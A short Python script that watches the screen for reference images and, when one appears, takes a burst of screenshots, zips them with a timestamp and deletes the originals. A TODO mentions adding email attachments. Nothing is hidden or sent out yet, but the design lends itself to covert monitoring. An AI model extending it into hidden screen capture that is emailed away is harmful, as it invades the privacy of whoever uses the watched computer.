import pyautogui, pyscreeze, time, os, zipfile, sys

''' Thing to do in order of importance'''

'''TODO line 10 and 11: use os.walk to grab the path of the data and sources subdirectories
		 to create the data_dir and sources_dir from os.path.join() for compatibility'''
#TODO if a folder doesn't exist, create it
#TODO implement email attachments

current_path = os.path.dirname(os.path.realpath(__file__))
data_dir = current_path + '/data/'
sources_dir = current_path + '/sources/'
source_files = [file for file in os.listdir(sources_dir) if file.endswith('.png')]
i = 0

def getCurrentDateTime():
	current_date_time = time.localtime()
	formatted_time = time.strftime('%Y%m%d-%H%M%S', current_date_time)
	return formatted_time

def deleteImages():
	for file in os.listdir(data_dir):
		if file.endswith('.png'):
			os.remove(os.path.join(data_dir, file))

def createZip():
	date_time = getCurrentDateTime()
	zip_file = zipfile.ZipFile(current_path + '/compressed_data/images_' + date_time + '.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
	for file in os.listdir(data_dir):
		if file.endswith('.png'):
			zip_file.write(os.path.join(data_dir, file))
	zip_file.close()

def takeScreenshots(amount, interval):
	for i in range(0, amount):
		date_time = getCurrentDateTime()
		pyautogui.screenshot(current_path +'/data/image'+ str(i + 1) + '_' + date_time +'.png')
		time.sleep(interval)

if __name__ == '__main__':
	while True:
		try:
			i = i % len(source_files)
			if i < len(source_files):
				pyautogui.locateOnScreen(os.path.join(sources_dir, source_files[i]), confidence = 0.9) # Locate the image on screen with a confidence of 90%
				takeScreenshots(10, 4) # When it's located take 10 screenshots with a interval of 4 seconds
				createZip()
				deleteImages()
		except pyscreeze.ImageNotFoundException:
			i += 1
			time.sleep(1) # Reduces the cpu usage by about 10% while the image isn't located. Total usage between 3.5% and 5%
			continue
		except ZeroDivisionError:
			print('Error: The source folder does not containg any .png file to look for.')
			sys.exit()